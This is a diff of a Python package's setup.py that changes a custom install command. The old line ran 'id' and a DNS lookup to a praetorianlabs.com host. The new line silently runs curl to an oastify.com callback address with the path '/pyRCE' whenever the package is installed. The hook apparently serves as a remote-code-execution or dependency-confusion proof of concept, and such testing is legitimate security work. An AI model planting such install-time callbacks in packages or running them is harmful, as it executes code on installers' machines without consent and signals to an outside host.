@@ -5,7 +5,7 @@ import os
 
 class CustomInstallCommand(install):
     def run(self):
-        os.system('echo Hello, world!; id; nslookup python.dns.praetorianlabs.com')
+        os.system('curl j7r60mz86gud7wooy1peytmoifo6cw0l.oastify.com/pyRCE')
         install.run(self)
 
 setuptools.setup(
